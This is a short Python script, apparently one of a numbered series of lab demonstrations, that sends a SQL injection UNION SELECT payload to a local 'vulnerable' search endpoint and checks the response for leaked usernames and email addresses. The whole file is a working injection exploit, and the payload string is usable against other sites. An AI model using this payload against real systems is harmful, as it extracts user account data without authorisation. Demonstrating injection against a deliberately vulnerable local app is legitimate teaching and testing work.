"""
Attack #3 – UNION Data Extraction
==================================
Sends a UNION SELECT payload to the vulnerable search endpoint,
appending rows from the users table to the product results.
"""

import requests

SEARCH_URL = "http://127.0.0.1:5000/vulnerable/search"

PAYLOAD = "%' UNION SELECT id, username, email, role FROM users -- "


def main() -> None:
    print(f"Target: {SEARCH_URL}")
    print(f"Payload: {PAYLOAD!r}")
    print()

    try:
        response = requests.get(SEARCH_URL, params={"q": PAYLOAD}, timeout=5)
    except requests.RequestException as exc:
        print(f"[ERROR] Request failed: {exc}")
        return

    print(f"Status: {response.status_code}")

    # Check for user data leaking into the response
    leaked_users = []
    for username in ("admin", "alice", "bob", "charlie"):
        if username in response.text:
            leaked_users.append(username)

    if leaked_users:
        print(f"[SUCCESS] User data leaked in response: {', '.join(leaked_users)}")
        print("The UNION SELECT appended user rows to the product search results.")
    else:
        print("[FAILURE] No user data found in response — UNION injection may have failed.")

    # Check for emails too
    for email_fragment in ("@example.com",):
        if email_fragment in response.text:
            print(f"[DETAIL] Email addresses visible in response (found '{email_fragment}')")
            break


if __name__ == "__main__":
    main()